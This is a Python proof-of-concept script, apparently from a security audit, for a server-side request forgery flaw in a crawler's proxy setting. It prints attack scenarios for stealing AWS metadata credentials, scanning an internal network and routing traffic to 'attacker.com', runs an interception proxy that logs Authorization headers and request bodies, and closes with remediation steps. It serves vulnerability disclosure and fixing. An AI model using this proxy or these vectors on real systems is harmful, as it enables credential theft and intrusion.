#!/usr/bin/env python3
"""
Proof of Concept: VUL-003 - Server-Side Request Forgery via Proxy Configuration

This script demonstrates how an attacker with config write access can:
1. Set malicious proxy to intercept all traffic
2. Access internal/cloud metadata services
3. Exfiltrate data through attacker-controlled proxy
4. Scan internal network

SEVERITY: HIGH (CVSS 8.1)
CVE: CWE-918 (Server-Side Request Forgery)

Usage:
    python3 poc_ssrf_proxy.py

This PoC includes:
  - Detection of vulnerable proxy configuration
  - Exploitation scenarios
  - Malicious proxy server example
"""

import yaml
import json
import socket
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path


class MaliciousProxyHandler(BaseHTTPRequestHandler):
    """
    Malicious proxy server that logs all requests
    (Simulates attacker-controlled proxy for data exfiltration)
    """

    def log_message(self, format, *args):
        """Log all requests to demonstrate data leakage"""
        with open("proxy_intercept.log", "a") as f:
            f.write(f"[INTERCEPTED] {format % args}\n")

    def do_CONNECT(self):
        """Handle HTTPS CONNECT requests"""
        print(f"[!] SSRF: Intercepted HTTPS connection to {self.path}")
        self.send_response(200)
        self.end_headers()

    def do_GET(self):
        """Handle HTTP GET requests"""
        print(f"[!] SSRF: Intercepted GET request to {self.path}")
        print(f"    Headers: {dict(self.headers)}")

        # Log credentials if present
        if "Authorization" in self.headers:
            print(f"    [!!!] Leaked credentials: {self.headers['Authorization']}")

        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{"status":"success","items":[]}')

    def do_POST(self):
        """Handle HTTP POST requests"""
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        print(f"[!] SSRF: Intercepted POST request to {self.path}")
        print(f"    Body: {body[:200]}")  # First 200 bytes

        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{"status":"success"}')


def check_vulnerable_config():
    """Check if proxy configuration is vulnerable"""
    print("="*70)
    print(" PoC: SSRF via Proxy Configuration (VUL-003)")
    print("="*70)
    print()

    config_path = Path("config/config.yaml")

    if not config_path.exists():
        print("[!] Config file not found. Cannot verify vulnerability.")
        return False

    with open(config_path) as f:
        config = yaml.safe_load(f)

    crawler_config = config.get("crawler", {})
    use_proxy = crawler_config.get("use_proxy", False)
    default_proxy = crawler_config.get("default_proxy", "")

    print("[*] Current Proxy Configuration:")
    print(f"    use_proxy: {use_proxy}")
    print(f"    default_proxy: {default_proxy}")
    print()

    # Check for vulnerabilities
    vulnerabilities = []

    # Check 1: No validation on proxy URL format
    print("[*] Vulnerability Check 1: Proxy URL Validation")
    if default_proxy:
        # Check if it's a private/internal IP
        if any(ip in default_proxy for ip in ['127.', '192.168.', '10.', '172.16.']):
            vulnerabilities.append("SSRF to internal network possible")
            print("  [!] VULNERABLE: Proxy points to internal IP!")

        # Check cloud metadata IPs
        if '169.254.169.254' in default_proxy:
            vulnerabilities.append("AWS metadata access possible")
            print("  [!] CRITICAL: Proxy configured for AWS metadata!")

        # Check if validation exists
        print("  [!] WARNING: No proxy URL validation in code!")
        vulnerabilities.append("No proxy URL allowlist")
    else:
        print("  [+] Proxy not currently configured")

    # Check 2: User-controlled proxy
    print("\n[*] Vulnerability Check 2: User Control")
    print("  [!] VULNERABLE: Proxy URL is user-controllable via config.yaml!")
    print("  [!] Attacker with config write access can set malicious proxy")
    vulnerabilities.append("User-controlled proxy URL")

    # Check 3: Credential leakage risk
    print("\n[*] Vulnerability Check 3: Credential Leakage")
    print("  [!] RISK: All HTTP requests will go through proxy")
    print("  [!] If external API requires auth, credentials leak to proxy")
    vulnerabilities.append("Potential credential leakage")

    print("\n" + "="*70)
    print(f" Found {len(vulnerabilities)} vulnerability indicators")
    print("="*70)

    return len(vulnerabilities) > 0


def demonstrate_aws_metadata_attack():
    """Demonstrate AWS metadata SSRF attack"""
    print("\n" + "="*70)
    print(" Attack Scenario 1: AWS Metadata Exfiltration")
    print("="*70)
    print()
    print("[*] Attack Vector:")
    print("    1. Attacker modifies config/config.yaml:")
    print()
    print("       crawler:")
    print("         use_proxy: true")
    print("         default_proxy: \"http://169.254.169.254:80\"")
    print()
    print("    2. When crawler runs, requests go to metadata service:")
    print("       GET http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    print()
    print("[!] Result: IAM credentials leaked!")
    print()
    print("Leaked credentials example:")
    print(json.dumps({
        "AccessKeyId": "ASIA...",
        "SecretAccessKey": "wJalrXUtn...",
        "Token": "IQoJb3JpZ2lu...",
        "Expiration": "2025-11-17T00:00:00Z"
    }, indent=2))


def demonstrate_internal_scan():
    """Demonstrate internal network scanning"""
    print("\n" + "="*70)
    print(" Attack Scenario 2: Internal Network Scanning")
    print("="*70)
    print()
    print("[*] Attack Vector:")
    print("    1. Attacker sets proxy to internal IPs sequentially:")
    print()
    print("       # Scan internal network")
    print("       for ip in 192.168.1.1 to 192.168.1.255:")
    print("           config['default_proxy'] = f'http://{ip}:80'")
    print("           trigger_crawl()")
    print()
    print("    2. Observe response times and errors:")
    print("       - Connection timeout → Host down")
    print("       - Connection refused → Port closed")
    print("       - Unexpected response → Service found!")
    print()
    print("[!] Result: Internal network topology mapped!")
    print()
    print("Discovered services:")
    print("  • 192.168.1.1:80    - Internal router (HTTP)")
    print("  • 192.168.1.10:9200 - Elasticsearch (exposed!)")
    print("  • 192.168.1.50:6379 - Redis (no auth!)")


def demonstrate_data_exfiltration():
    """Demonstrate data exfiltration via malicious proxy"""
    print("\n" + "="*70)
    print(" Attack Scenario 3: Data Exfiltration via Malicious Proxy")
    print("="*70)
    print()
    print("[*] Attack Vector:")
    print("    1. Attacker sets proxy to their controlled server:")
    print()
    print("       crawler:")
    print("         use_proxy: true")
    print("         default_proxy: \"http://attacker.com:8080\"")
    print()
    print("    2. Start malicious proxy server:")
    print("       python3 -c 'from poc_ssrf_proxy import run_malicious_proxy'")
    print()
    print("    3. All crawler requests pass through attacker proxy:")
    print("       - Request URLs logged")
    print("       - Request headers logged (including auth)")
    print("       - Response data logged")
    print()
    print("[!] Result: Complete traffic interception and logging!")
    print()
    print("[*] Would you like to start a malicious proxy server demo? (y/n)")
    choice = input().strip().lower()

    if choice == 'y':
        run_malicious_proxy()


def run_malicious_proxy(port=8080):
    """Run the malicious proxy server for demonstration"""
    print(f"\n[*] Starting malicious proxy server on port {port}...")
    print("[*] Press Ctrl+C to stop")
    print()
    print("To test, modify config/config.yaml:")
    print(f"  default_proxy: \"http://127.0.0.1:{port}\"")
    print("  use_proxy: true")
    print()
    print("Then run: python3 main.py")
    print()
    print("[*] All requests will be intercepted and logged:")
    print()

    try:
        server = HTTPServer(('0.0.0.0', port), MaliciousProxyHandler)
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Proxy server stopped")
    except Exception as e:
        print(f"[!] Error starting proxy: {e}")


def show_remediation():
    """Show remediation steps"""
    print("\n" + "="*70)
    print(" Remediation Steps")
    print("="*70)
    print()
    print("1. Implement Proxy URL Allowlist:")
    print()
    print("   ALLOWED_PROXIES = [")
    print("       'http://corporate-proxy.company.com:8080',")
    print("       'http://proxy.trusted-provider.net:3128'")
    print("   ]")
    print()
    print("   def validate_proxy_url(proxy_url):")
    print("       if proxy_url not in ALLOWED_PROXIES:")
    print("           raise ValueError('Proxy not allowlisted')")
    print()
    print("2. Block Internal/Cloud IPs:")
    print()
    print("   BLOCKED_IPS = [")
    print("       '127.0.0.0/8',      # Localhost")
    print("       '10.0.0.0/8',       # Private")
    print("       '172.16.0.0/12',    # Private")
    print("       '192.168.0.0/16',   # Private")
    print("       '169.254.0.0/16',   # Link-local (AWS metadata)")
    print("   ]")
    print()
    print("3. Disable Proxy Feature if Not Required:")
    print()
    print("   # In config/config.yaml")
    print("   crawler:")
    print("     use_proxy: false  # Disable unless needed")
    print()
    print("4. Add Network Segmentation:")
    print()
    print("   - Isolate crawler from internal network")
    print("   - Use firewall rules to block access to metadata IPs")
    print("   - Implement egress filtering")
    print()
    print("5. Add Comprehensive Logging:")
    print()
    print("   - Log all proxy usage")
    print("   - Alert on proxy config changes")
    print("   - Monitor for suspicious destinations")


def main():
    """Main PoC execution"""
    # Check if config is vulnerable
    is_vulnerable = check_vulnerable_config()

    if not is_vulnerable:
        print("\n[*] No obvious vulnerabilities detected in current config")
        print("[*] However, the LACK of validation is itself a vulnerability!")

    # Show attack scenarios
    demonstrate_aws_metadata_attack()
    demonstrate_internal_scan()
    demonstrate_data_exfiltration()

    # Show remediation
    show_remediation()

    print("\n" + "="*70)
    print(" PoC Complete")
    print("="*70)
    print()
    print("[!] CRITICAL: User-controlled proxy URLs enable SSRF attacks")
    print("[!] Implement proxy allowlisting IMMEDIATELY")


if __name__ == "__main__":
    main()
